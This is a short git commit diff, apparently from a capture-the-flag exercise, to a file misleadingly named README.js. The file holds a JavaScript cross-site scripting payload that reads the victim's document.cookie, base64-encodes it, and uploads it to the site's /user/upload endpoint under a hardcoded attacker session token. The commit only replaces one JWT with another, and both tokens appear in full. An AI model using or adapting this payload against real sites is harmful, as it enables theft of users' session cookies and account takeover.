e837a443750ab59f35d902bc2ea3b1c0905a9697
arang <jaewook376@naver.com>
2023-06-01 19:56:35 +0900

    Update README.jsa

--- README.js
+++ README.js
@@ -2,7 +2,7 @@ fetch("/user/upload", {
   method: "POST",
   headers: {
     "Content-Type": "text/plain",
-    "Cookie": "dream-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY4NTYxNjcxMiwianRpIjoiMGU0MjM4YTQtYjZlNi00OTFiLTgyNGQtN2ZlMTU5YmRmZDc3IiwibmJmIjoxNjg1NjE2NzEyLCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoyLCJleHAiOjE2ODU2MTc2MTJ9.bL569TlnEpi0QZdrx-Y7t_0CjkYpPJeAjyBCoFaqfnw"
+    "Cookie": "dream-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY4NTYxNjkyNywianRpIjoiMWQ4NTEyN2QtM2Y5Ny00NWNiLWFlNGUtZmY1ODIzNWQ1MDEzIiwibmJmIjoxNjg1NjE2OTI3LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoyLCJleHAiOjE2ODU2MTc4Mjd9.GPwFvuv1mL7H6MB3zbUG38CLjIUe0szON63bcVQSJzA"
   },
   body: "filename=asdf&data="+btoa(document.cookie),
 }).then(e=>e.text()).then(e=>{console.log(e)})
